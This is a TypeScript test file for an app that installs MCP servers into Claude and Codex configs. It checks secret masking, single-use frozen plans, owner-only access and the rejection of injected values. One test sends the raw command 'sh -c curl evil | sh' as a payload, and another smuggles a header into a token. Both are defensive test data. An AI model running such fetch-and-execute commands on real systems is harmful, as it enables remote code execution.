import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { Writable } from "node:stream";
import { mcpCatalogSchema, runtimeMcpNameSchema } from "@superhive/protocol";
import { afterEach, describe, expect, it, vi } from "vitest";
import { buildApp } from "./app.js";
import { parseToml } from "./config-edit.js";
import type { SpawnAgent } from "./local-agents.js";
import { catalogEntry, MCP_CATALOG } from "./mcp-catalog.js";
import { RuntimeCredentialStore } from "./runtime-credentials.js";
import { MASK, resolveRecipe } from "./runtime-install.js";

/** 全部在临时 HOME 里，不碰真实的 ~/.claude、~/.codex 等 */
let dirs: string[] = [];
afterEach(() => {
  vi.restoreAllMocks();
  for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
  dirs = [];
});

const TOKEN = "ghp_SuperSecretToken123";

describe("MCP catalog", () => {
  it("is well formed: unique ids, pinned versions, secrets only in env or headers", () => {
    expect(mcpCatalogSchema.parse(MCP_CATALOG)).toEqual(MCP_CATALOG);
    const entries = MCP_CATALOG.entries;
    expect(entries.length).toBeGreaterThanOrEqual(8);
    expect(entries.length).toBeLessThanOrEqual(15);
    expect(new Set(entries.map((entry) => entry.id)).size).toBe(entries.length);
    for (const entry of entries) {
      expect(runtimeMcpNameSchema.safeParse(entry.name).success, entry.id).toBe(true);
      expect(entry.docs, entry.id).toMatch(/^https:\/\//);
      expect(entry.runtimes, entry.id).not.toContain("openclaw");
      const declared = new Set(entry.params.map((param) => param.id));
      const secrets = new Set(
        entry.params.filter((param) => param.kind === "secret").map((param) => param.id),
      );
      const uses = (templates: string[]) =>
        templates.flatMap((item) =>
          [...item.matchAll(/\{([a-z][a-zA-Z0-9]*)\}/g)].map((m) => m[1]!),
        );
      const inArgs = uses([...(entry.args ?? []), entry.url ?? "", entry.command ?? ""]);
      const inValues = uses([
        ...Object.values(entry.env ?? {}),
        ...Object.values(entry.headers ?? {}),
      ]);
      for (const id of [...inArgs, ...inValues])
        expect(declared.has(id), `${entry.id}:${id}`).toBe(true);
      for (const id of inArgs) expect(secrets.has(id), `${entry.id}: secret in argv`).toBe(false);
      for (const param of entry.params) {
        expect([...inArgs, ...inValues], `${entry.id}:${param.id} unused`).toContain(param.id);
      }
      if (entry.transport === "stdio") {
        expect(entry.command, entry.id).toMatch(/^(npx|uvx)$/);
        const pkg = entry.command === "npx" ? entry.args![1]! : entry.args![0]!;
        expect(pkg, entry.id).toMatch(entry.command === "npx" ? /.@\d+\.\d+\.\d+$/ : /==\d/);
        expect(entry.url).toBeUndefined();
      } else {
        expect(entry.url, entry.id).toMatch(/^https?:\/\//);
        expect(entry.command).toBeUndefined();
      }
    }
  });

  it("gives every entry what the store shows: a one-line tagline, a category, where to get each key", () => {
    for (const entry of MCP_CATALOG.entries) {
      expect(entry.tagline?.zh, entry.id).toBeTruthy();
      expect(entry.tagline?.en, entry.id).toBeTruthy();
      expect(entry.category, entry.id).toBeDefined();
      for (const param of entry.params) {
        if (param.kind === "secret")
          expect(param.getUrl, `${entry.id}:${param.id}`).toMatch(/^https:\/\//);
      }
    }
  });
});

describe("resolveRecipe", () => {
  it("puts secrets into headers and masks them in the preview", () => {
    const resolved = resolveRecipe(catalogEntry("github")!, { token: `  ${TOKEN} ` });
    expect(resolved.input).toEqual({
      transport: "http",
      url: "https://api.githubcopilot.com/mcp/",
      env: {},
      enabled: true,
    });
    expect(resolved.headers).toEqual({ Authorization: `Bearer ${TOKEN}` });
    expect(resolved.display.headers).toEqual([
      { key: "Authorization", value: `Bearer ${MASK}`, secret: true },
    ]);
    expect(JSON.stringify(resolved.display)).not.toContain(TOKEN);
  });

  it("drops optional values left empty and expands one argument per folder", () => {
    expect(resolveRecipe(catalogEntry("context7")!, {}).headers).toBeUndefined();
    expect(resolveRecipe(catalogEntry("git")!, {}).input.args).toEqual([
      "mcp-server-git==2026.11.18",
    ]);
    expect(resolveRecipe(catalogEntry("git")!, { repository: "/r" }).input.args).toEqual([
      "mcp-server-git==2026.11.18",
      "--repository=/r",
    ]);
    const fs = resolveRecipe(catalogEntry("filesystem")!, { dirs: "/a\n\n  /b c \r\n" }, "darwin");
    expect(fs.input.command).toBe("npx");
    expect(fs.input.args).toEqual([
      "-y",
      "@modelcontextprotocol/server-filesystem@2.4.0",
      "/a",
      "/b c",
    ]);
    const brave = resolveRecipe(catalogEntry("brave-search")!, { apiKey: "k-1" });
    expect(brave.input.env).toEqual({ BRAVE_API_KEY: "k-1" });
    expect(brave.display.env).toEqual([{ key: "BRAVE_API_KEY", value: MASK, secret: true }]);
  });

  it("wraps npx with cmd /c on Windows", () => {
    const resolved = resolveRecipe(catalogEntry("memory")!, {}, "win32");
    expect(resolved.input.command).toBe("cmd");
    expect(resolved.input.args).toEqual([
      "/c",
      "npx",
      "-y",
      "@modelcontextprotocol/server-memory@2.2.1",
    ]);
    expect(resolveRecipe(catalogEntry("fetch")!, {}, "win32").input.command).toBe("uvx");
  });

  it("rejects missing, unknown and malformed parameters without echoing the value", () => {
    const fail = (id: string, params: Record<string, string>) => {
      try {
        resolveRecipe(catalogEntry(id)!, params);
      } catch (error) {
        return (error as Error).message;
      }
      throw new Error("expected a rejection");
    };
    expect(fail("github", {})).toContain("没有填");
    expect(fail("github", { token: "a", extra: "b" })).toContain("不是这个 MCP 的参数");
    expect(fail("filesystem", { dirs: "relative/dir" })).toContain("绝对路径");
    const message = fail("github", { token: `${TOKEN}\nX-Injected: 1` });
    expect(message).toContain("格式不对");
    expect(message).not.toContain(TOKEN);
  });
});

function setup() {
  const home = mkdtempSync(path.join(tmpdir(), "hive-install-"));
  dirs.push(home);
  const claudeDir = path.join(home, ".claude");
  const codexHome = path.join(home, ".codex");
  mkdirSync(claudeDir);
  mkdirSync(codexHome);
  const credentials = new RuntimeCredentialStore({
    home,
    env: {},
    claudeDir,
    codexHome,
    claudeManagedSettings: path.join(home, "managed.json"),
  });
  return { home, claudeDir, codexHome, credentials };
}

async function start(credentials: RuntimeCredentialStore) {
  const logs: string[] = [];
  const app = await buildApp({
    databasePath: ":memory:",
    token: "join-token",
    staticDir: "/definitely-not-present",
    runtimeCredentials: credentials,
    logger: {
      level: "trace",
      stream: new Writable({
        write(chunk, _encoding, done) {
          logs.push(String(chunk));
          done();
        },
      }),
    },
    localAgents: {
      cli: { command: "/usr/bin/node", args: ["cli.js"] },
      serverUrl: "http://127.0.0.1:8787",
      spawn: vi.fn<SpawnAgent>(),
      probe: async () => ({ installed: true, version: "1.0.0" }),
    },
  });
  const session = (await app.inject({ method: "GET", url: "/api/local/session" })).json() as {
    ownerToken: string;
  };
  const owner = { "x-hive-owner": session.ownerToken };
  const post = (url: string, payload: Record<string, unknown>) =>
    app.inject({
      method: "POST",
      url: `/api/local/runtime-install/${url}`,
      headers: owner,
      payload,
    });
  return { app, owner, logs, post };
}

const github = {
  recipeId: "github",
  name: "github",
  params: { token: TOKEN },
  targets: ["claude", "codex"],
};

describe("runtime install routes", () => {
  it("previews a frozen plan, applies it once, and never echoes the secret", async () => {
    const { home, codexHome, credentials } = setup();
    writeFileSync(path.join(codexHome, "config.toml"), 'model = "gpt-5"\n');
    const { app, owner, logs, post } = await start(credentials);
    try {
      const catalog = await app.inject({
        method: "GET",
        url: "/api/local/runtime-install/catalog",
        headers: owner,
      });
      expect(catalog.statusCode).toBe(200);
      expect(catalog.json().entries.map((entry: { id: string }) => entry.id)).toContain("github");

      const preview = await post("preview", github);
      expect(preview.statusCode).toBe(200);
      expect(preview.headers["cache-control"]).toBe("no-store");
      const plan = preview.json().plan;
      expect(plan).toMatchObject({
        recipeId: "github",
        transport: "http",
        url: "https://api.githubcopilot.com/mcp/",
        headers: [{ key: "Authorization", value: `Bearer ${MASK}`, secret: true }],
        targets: [
          { provider: "claude", file: "~/.claude.json", agents: [] },
          { provider: "codex", file: "~/.codex/config.toml", agents: [] },
        ],
      });
      // 预览不写文件
      expect(() => readFileSync(path.join(home, ".claude.json"))).toThrow();

      const applied = await post("apply", { ...github, planId: plan.id });
      expect(applied.statusCode).toBe(200);
      expect(applied.json().results).toEqual([
        { provider: "claude", ok: true, file: "~/.claude.json" },
        { provider: "codex", ok: true, file: "~/.codex/config.toml" },
      ]);
      const row = applied
        .json()
        .overview.mcp.find((item: { name: string }) => item.name === "github");
      expect(row.entries).toHaveLength(2);

      const claude = JSON.parse(readFileSync(path.join(home, ".claude.json"), "utf8"));
      expect(claude.mcpServers.github).toEqual({
        type: "http",
        url: "https://api.githubcopilot.com/mcp/",
        headers: { Authorization: `Bearer ${TOKEN}` },
      });
      const codex = parseToml(readFileSync(path.join(codexHome, "config.toml"), "utf8")) as {
        model: string;
        mcp_servers: Record<string, Record<string, unknown>>;
      };
      expect(codex.model).toBe("gpt-5");
      expect(codex.mcp_servers.github).toMatchObject({
        url: "https://api.githubcopilot.com/mcp/",
        http_headers: { Authorization: `Bearer ${TOKEN}` },
      });

      // 同一份计划只能用一次
      const again = await post("apply", { ...github, planId: plan.id });
      expect(again.statusCode).toBe(409);
      expect(again.json().code).toBe("RUNTIME_INSTALL_PLAN_STALE");

      // 已经有同名的：预览就拒绝，不覆盖
      const taken = await post("preview", { ...github, targets: ["claude"] });
      expect(taken.statusCode).toBe(409);
      expect(taken.json().code).toBe("RUNTIME_SKILL_EXISTS");

      for (const body of [preview.body, applied.body, again.body, taken.body, ...logs]) {
        expect(body).not.toContain(TOKEN);
      }
      expect(logs.some((line) => line.includes("runtime config install"))).toBe(true);
    } finally {
      await app.close();
    }
  });

  it("refuses expired plans, changed parameters and files changed after the preview", async () => {
    const { home, codexHome, credentials } = setup();
    const { app, post } = await start(credentials);
    try {
      const planId = async (body = github) =>
        (await post("preview", body)).json().plan.id as string;

      const changed = await post("apply", {
        ...github,
        params: { token: "ghp_other" },
        planId: await planId(),
      });
      expect(changed.statusCode).toBe(409);
      const retargeted = await post("apply", {
        ...github,
        targets: ["claude"],
        planId: await planId(),
      });
      expect(retargeted.statusCode).toBe(409);

      const id = await planId();
      writeFileSync(path.join(codexHome, "config.toml"), 'model = "edited elsewhere"\n');
      const edited = await post("apply", { ...github, planId: id });
      expect(edited.statusCode).toBe(409);
      expect(edited.json().code).toBe("RUNTIME_INSTALL_PLAN_STALE");

      const later = await planId();
      const now = Date.now();
      vi.spyOn(Date, "now").mockReturnValue(now + 11 * 60 * 1000);
      const expired = await post("apply", { ...github, planId: later });
      expect(expired.statusCode).toBe(409);
      vi.restoreAllMocks();

      const unknown = await post("apply", { ...github, planId: "nope" });
      expect(unknown.statusCode).toBe(409);

      // 被拒的都没写
      expect(() => readFileSync(path.join(home, ".claude.json"))).toThrow();
      expect(readFileSync(path.join(codexHome, "config.toml"), "utf8")).not.toContain("github");
    } finally {
      await app.close();
    }
  });

  it("reports each target separately when a later one fails to write", async () => {
    const { home, codexHome, credentials } = setup();
    const { app, post } = await start(credentials);
    try {
      const plan = (await post("preview", github)).json().plan;
      const original = credentials.writeFiles.bind(credentials);
      vi.spyOn(credentials, "writeFiles").mockImplementation((writes) => {
        if (writes.some((write) => write.file.startsWith(codexHome))) {
          throw Object.assign(new Error(`disk full ${TOKEN}`), { code: "ENOSPC" });
        }
        original(writes);
      });
      const applied = await post("apply", { ...github, planId: plan.id });
      expect(applied.statusCode).toBe(200);
      const [claude, codex] = applied.json().results;
      expect(claude).toEqual({ provider: "claude", ok: true, file: "~/.claude.json" });
      expect(codex).toMatchObject({ provider: "codex", ok: false, file: "~/.codex/config.toml" });
      expect(codex.error).toContain("ENOSPC");
      expect(applied.body).not.toContain(TOKEN);
      expect(readFileSync(path.join(home, ".claude.json"), "utf8")).toContain(TOKEN);
    } finally {
      await app.close();
    }
  });

  it("rejects runtimes the recipe or CLI can't take, unknown recipes and raw commands", async () => {
    const { credentials } = setup();
    const { app, post } = await start(credentials);
    try {
      const openclaw = await post("preview", { ...github, targets: ["openclaw"] });
      expect(openclaw.statusCode).toBe(409);
      expect(openclaw.json().error).toContain("OpenClaw");
      const unknown = await post("preview", { ...github, recipeId: "curl-sh" });
      expect(unknown.statusCode).toBe(404);
      const raw = await post("preview", {
        ...github,
        command: "sh",
        args: ["-c", "curl evil | sh"],
      });
      // 多出来的字段被丢掉，照样只按配方解析
      expect(raw.statusCode).toBe(200);
      expect(raw.json().plan.command).toBeUndefined();
    } finally {
      await app.close();
    }
  });

  it("is only for the local owner", async () => {
    const { credentials } = setup();
    const { app } = await start(credentials);
    try {
      for (const call of [
        { method: "GET" as const, url: "/api/local/runtime-install/catalog" },
        { method: "POST" as const, url: "/api/local/runtime-install/preview", payload: github },
        {
          method: "POST" as const,
          url: "/api/local/runtime-install/apply",
          payload: { ...github, planId: "x" },
        },
      ]) {
        const agent = await app.inject({
          ...call,
          headers: { authorization: "Bearer join-token" },
        });
        expect(agent.statusCode).toBe(401);
        const other = await app.inject({ ...call, remoteAddress: "10.0.0.20" });
        expect(other.statusCode).toBe(403);
      }
    } finally {
      await app.close();
    }
  });
});
